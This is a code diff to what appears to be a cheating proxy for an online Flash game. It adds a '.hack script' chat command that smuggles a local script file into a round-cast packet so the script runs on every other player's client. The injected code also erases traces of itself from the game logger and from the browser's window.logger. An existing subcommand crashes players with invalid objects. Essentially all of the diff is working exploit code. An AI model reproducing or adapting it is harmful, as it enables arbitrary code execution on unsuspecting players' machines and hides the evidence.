@@ -118,6 +118,13 @@ module.exports = function(options) {
 		})
 	}
 
+	function castMapTimer(client, isHaxe, script) {
+		script = script + 'try{self.enabled = false;}catch(e:Dynamic){};try{self.dispose();}catch(e:Dynamic){};Type.resolveClass("game.mainGame.SquirrelGame").instance.map.gameObjects().pop();var i=Logger.messages.length-1;while(i>=0&&(Logger.messages[i].indexOf("PacketRoundCastBegin") == -1||Logger.messages[i].indexOf("window.logger") == -1)){Logger.messages.pop();i--;};Logger.messages.pop();Logger.messages.pop();if(Type.resolveClass("flash.external.ExternalInterface").call("eval","\\"logger\\" in window;")){Type.resolveClass("flash.external.ExternalInterface").call("eval", "setTimeout(function(){var log=window.logger.log.split(\\"\\\\n\\");var i=log.length-1;while(i>=0&&(log[i].indexOf(\\"PacketRoundCastBegin\\") == -1||log[i].indexOf(\\"window.logger\\") == -1)){log.pop();i--;};log.pop();log.pop();window.logger.log=log.join(\\"\\\\n\\");},500)");};'
+		let data = JSON.stringify([[1048575,1048575],[73,[["",script,true,1,1,0,false,true,[1048575,1048575],isHaxe]]]])
+		client.proxy.sendData('ROUND_CAST_BEGIN', 73, data)
+		client.proxy.sendData('ROUND_CAST_END', 0, 73, 1)
+	}
+
 	function sendHollow(client) {
 		if (client.storage.gameInjected)
 			runScript(client, true, "if(Hero.self != null){Hero.self.onHollow(0);}")
@@ -1025,6 +1032,18 @@ module.exports = function(options) {
 		crashPlayers(client)
 	}
 
+	function handleHackScriptCommand(client, chatType, args) {
+		let file = options.local.scriptsDir + '/' + args.shift()
+		if (!client.round.in)
+			return showMessage(client, 'Вы не на локации')
+		if (client.storage.shamans.indexOf(client.uid) === -1)
+			return showMessage(client, 'Вы не шаман')
+		if (!fs.existsSync(file))
+			return showMessage(client, 'Скрипт не найден')
+		let script = fs.readFileSync(file, 'utf8')
+		castMapTimer(client, !file.endsWith('.lua'), script)
+	}
+
 	function handleHackCommand(client, chatType, args) {
 		let cmd = args.shift()
 		switch (cmd) {
@@ -1034,7 +1053,8 @@ module.exports = function(options) {
 					'\n' +
 					'.hack olympic — локация "Стадион"\n' +
 					'.hack skill — баг отмены способности\n' +
-					'.hack crash — невалидный объект')
+					'.hack crash — невалидный объект\n' +
+					'.hack script [имя] — выполнить скрипт всем')
 				break
 			case 'olympic':
 				handleHackOlympicCommand(client, chatType, args)
@@ -1044,6 +1064,9 @@ module.exports = function(options) {
 				break
 			case 'crash':
 				handleHackCrashCommand(client, chatType, args)
+				break
+			case 'script':
+				handleHackScriptCommand(client, chatType, args)
 				break
 			default:
 				showMessage(client, 'Неизвестная подкоманда')
@@ -1182,6 +1205,9 @@ module.exports = function(options) {
 			case 'CHAT_MESSAGE':
 				if (handleChatMessageClientPacket(client, packet, buffer))
 					return false
+				break
+			case 'CHAT_COMMAND':
+				return false
 		}
 		client.proxy.sendPacket(packet)
 	}
